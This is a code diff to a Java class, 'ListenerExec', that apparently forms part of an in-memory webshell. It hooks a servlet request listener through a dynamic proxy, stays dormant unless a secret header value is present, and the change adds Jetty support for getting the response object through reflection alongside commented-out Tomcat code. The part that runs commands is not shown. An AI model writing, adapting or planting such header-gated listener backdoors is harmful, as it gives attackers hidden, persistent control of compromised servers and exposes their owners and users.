@@ -24,13 +24,15 @@ public class ListenerExec implements InvocationHandler {
     public Object invoke(Object proxy, Method method, Object[] args) {
         if (method.getName().equals("requestInitialized")) {
             run(args[0]);
+        } else if (method.getName().equals("equals")) {
+            return this.equals(args[0]);
         }
         return null;
     }
 
-    public Object getResponse(Object httpServletRequest) throws Exception {
-        return null;
-    }
+//    public Object getResponse(Object request) throws Exception {
+//        return null;
+//    }
 
     /**
      * tomcat
@@ -44,11 +46,26 @@ public class ListenerExec implements InvocationHandler {
 //        return httpServletResponse;
 //    }
 
+    /**
+     * Jetty
+     */
+    public Object getResponse(Object request) throws Exception {
+        // 8
+//
+        // request._connection._response
+
+        // 9 10
+        // request._channel._response
+
+        // 8
+        return invokeMethod(request, "getResponse", new Class[]{}, new Object[]{});
+    }
+
     private void run(Object sre) {
         try {
             Object request = invokeMethod(sre, "getServletRequest", new Class[]{}, new Object[]{});
             String lv = (String) invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{lockHeaderKey});
-            if(lv == null || !lv.contains(lockHeaderValue)) {
+            if (lv == null || !lv.contains(lockHeaderValue)) {
                 return;
             }
 
@@ -110,7 +127,7 @@ public class ListenerExec implements InvocationHandler {
     public static Object invokeMethod(Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
         try {
             return invokeMethod(obj.getClass(), obj, methodName, argsClass, args);
-        }catch (Exception e){
+        } catch (Exception e) {
             return invokeMethod(obj.getClass().getSuperclass(), obj, methodName, argsClass, args);
         }
     }
